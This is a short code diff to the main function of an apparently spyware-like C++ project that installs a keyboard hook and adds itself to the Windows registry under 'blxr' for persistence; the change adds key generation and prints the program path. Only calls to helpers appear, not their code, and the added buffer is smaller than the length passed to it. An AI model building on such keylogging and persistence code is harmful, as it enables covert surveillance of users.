@@ -2,8 +2,16 @@
 #include "keyhook.h"
 #include "screen.h"
 #include "sys.h"
+#include "encrypt.h"
 
 int main() {
+
+  WCHAR path[0xFF];
+  GetModuleFileNameW(nullptr, path, MAX_PATH);
+
+  std::wcout << path;
+
+  crypto::GenerateKeys();
   key_hook::InstallHook();
   sys::AddToRegistry("blxr");
 
@@ -17,3 +25,5 @@ int main() {
 
   return 0;
 }
+
+
